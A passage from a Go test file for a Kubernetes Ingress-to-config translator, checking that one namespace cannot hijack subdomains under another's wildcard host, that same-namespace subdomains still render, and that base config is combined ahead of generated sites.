		t.Fatalf("cross-namespace exact-subdomain-of-wildcard claim was NOT rejected; rejects=%v\n%s", rej, out)
	}
	if strings.Contains(out, "evil-svc") {
		t.Fatalf("attacker backend leaked into app.example.com (under team-a's wildcard):\n%s", out)
	}
}

// TestTranslateSameNamespaceWildcardSubdomainWorks: a namespace owns the concrete
// subdomains of its OWN wildcard — a same-ns exact Ingress under its own `*.example.com`
// still renders (ownership only blocks a FOREIGN namespace).
func TestTranslateSameNamespaceWildcardSubdomainWorks(t *testing.T) {
	t0 := time.Unix(1000, 0)
	t1 := time.Unix(2000, 0)
	wild := ingressAt("team-a", "wild", "*.example.com", t0, []pathRule{
		{path: "/", pathType: prefix, svc: "wild-svc", port: 80},
	})
	exact := ingressAt("team-a", "exact", "app.example.com", t1, []pathRule{
		{path: "/app", pathType: prefix, svc: "app-svc", port: 8080},
	})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{wild, exact}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("same-namespace exact-under-own-wildcard rejected: %v", rej)
	}
	mustCompile(t, out)
	if !strings.Contains(out, "k8s://app-svc.team-a:8080") {
		t.Fatalf("same-namespace concrete subdomain dropped:\n%s", out)
	}
}

func TestCombine(t *testing.T) {
	got := Combine("cache { ram 64MiB }", "example.com {\n}\n")
	if !strings.HasPrefix(got, "cache { ram 64MiB }\n") {
		t.Fatalf("base must precede generated sites:\n%s", got)
	}
	if !strings.Contains(got, "example.com {") {
		t.Fatalf("generated sites missing:\n%s", got)
	}
}
